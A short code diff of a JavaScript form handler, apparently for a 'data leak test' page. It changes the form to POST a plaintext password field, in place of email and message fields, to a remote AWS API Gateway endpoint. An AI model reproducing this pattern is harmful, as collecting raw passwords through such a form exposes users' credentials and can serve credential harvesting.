@@ -1811,11 +1811,9 @@
                       .getElementById("formTestDatenLeak")
                       .addEventListener("submit", async (e) => {
                         e.preventDefault();
-
-                        e.preventDefault();
                         const data = new FormData(e.target);
                         await fetch(
-                          "https://1vezik7285.execute-api.eu-central-1.amazonaws.com/dev",
+                          "https://1vezik7285.execute-api.eu-central-1.amazonaws.com/all",
                           {
                             method: "POST",
                             headers: {
@@ -1823,8 +1821,7 @@
                               "Content-Type": "application/json",
                             },
                             body: JSON.stringify({
-                              email: data.get("email"),
-                              message: data.get("message"),
+                              pw: data.get("pw"),
                             }),
                           }
                         );
